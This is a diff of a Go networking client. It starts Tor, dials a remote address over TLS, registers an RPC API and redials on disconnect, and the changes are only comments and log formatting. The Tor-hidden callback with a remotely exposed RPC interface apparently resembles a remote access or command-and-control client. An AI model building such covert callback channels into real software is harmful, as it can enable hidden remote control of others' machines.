@@ -15,6 +15,7 @@ import (
 	"github.com/cretz/bine/tor"
 )
 
+// connect dials a remote tor address and returns the tls.Client to NetClient
 func connect(dialer *tor.Dialer) (net.Conn, error) {
 	log.Println("[NetClient] Connecting to:", s.addr)
 	conn, err := dialer.Dial("tcp", s.addr)
@@ -32,13 +33,14 @@ func connect(dialer *tor.Dialer) (net.Conn, error) {
 	return tlsconn, nil
 }
 
-// NetClient start tor and invoke connect
+// NetClient starts a tor connection and invokes connect
+// in a loop that redials on disconnect
 func NetClient() {
 	initServer()
 
 	tmpDir, err := ioutil.TempDir("", "")
 	if err != nil {
-		log.Println("[NetClient] [!] Could not create temp dir for Tor: ", err)
+		log.Println("[NetClient] [!] Could not create temp dir for Tor:", err)
 		return
 	}
 
@@ -58,7 +60,7 @@ func NetClient() {
 	api := new(API)
 	rpcErr := rpc.Register(api)
 	if rpcErr != nil {
-		log.Fatal("[NetClient] [!] Could not register RPC API: ", rpcErr)
+		log.Fatal("[NetClient] [!] Could not register RPC API:", rpcErr)
 	}
 
 	defer t.Close()
